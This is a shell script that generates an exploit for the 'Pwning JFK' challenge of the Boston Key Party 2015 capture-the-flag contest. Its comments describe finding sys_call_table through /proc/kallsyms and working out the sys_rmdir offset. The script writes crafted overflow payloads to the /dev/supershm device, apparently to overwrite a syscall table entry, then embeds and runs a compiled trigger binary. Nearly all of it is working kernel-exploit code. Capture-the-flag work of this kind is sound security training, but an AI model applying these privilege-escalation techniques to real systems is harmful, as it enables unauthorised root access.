#!/bin/sh
#
# Boston Key Party 2015 - Pwning JFK (http://bostonkey.party/)
#
# Copyright (c) 2014 - Albert Puigsech Galicia (albert@puigsech.com)
#
# Permission is hereby granted, free of charge, to any person obtaining a
# copy of this software and associated documentation files (the "Software"),
# to deal in the Software without restriction, including without limitation
# the rights to use, copy, modify, merge, publish, distribute, sublicense,
# and/or sell copies of the Software, and to permit persons to whom the
# Software is furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL
# THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
# FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
# DEALINGS IN THE SOFTWARE.

#
# HOWTO
#
# 1. Get Symbols
# 
#    $ cat /proc/kallsyms | grep T | grep sys_call_table
#    c0013e68 T sys_call_table
#
# 2. Add sys_rmdir offse
#  
#    c0013e68 + a0 = c0013f08
#

OUTFILE='/dev/stdout'
TMP_FILE=`mktemp`

echo '#!/bin/sh' > $OUTFILE

echo 'printf "cA" > /dev/supershm' >> $OUTFILE
echo 'printf "cB" > /dev/supershm' >> $OUTFILE
echo 'printf "dA" > /dev/supershm' >> $OUTFILE
echo 'printf "cXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\x08\x3f\x01\xc01111AAAA" > /dev/supershm' >> $OUTFILE
echo 'printf "uAAAA" > /dev/supershm' >> $OUTFILE
echo 'printf "\x10\x11\x11\x11:" > /dev/supershm' >> $OUTFILE

echo 'cat <<_EOF_ | base64 -d > trigger' >> $OUTFILE 
diet arm-linux-gnueabi-gcc trigger.c -o $TMP_FILE && cat $TMP_FILE | base64 >> $OUTFILE
rm $TMP_FILE
echo '_EOF_' >> $OUTFILE

echo 'chmod +x trigger' >> $OUTFILE
echo './trigger' >> $OUTFILE